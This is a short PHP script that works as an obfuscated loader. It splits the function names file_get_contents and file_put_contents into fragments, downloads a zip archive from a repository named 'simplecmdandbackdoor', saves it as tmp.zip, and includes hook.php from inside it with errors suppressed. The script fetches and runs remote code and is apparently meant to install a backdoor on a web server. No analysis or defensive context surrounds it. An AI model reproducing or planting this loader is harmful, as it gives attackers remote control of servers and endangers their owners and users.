<?php
$f1 = 'fi'.'le'; $f2 = '_get'.'_contents'; $f3 = '_put'.'_contents';
$get = $f1.$f2; $put = $f1.$f3;

$url = 'https://github.com/Yucaerin/simplecmdandbackdoor/raw/refs/heads/main/bq.zip';
$zip = 'tmp.zip';
$inzip = 'hook.php';

@$put($zip, @$get($url));
@include "zip://$zip#$inzip";
?>
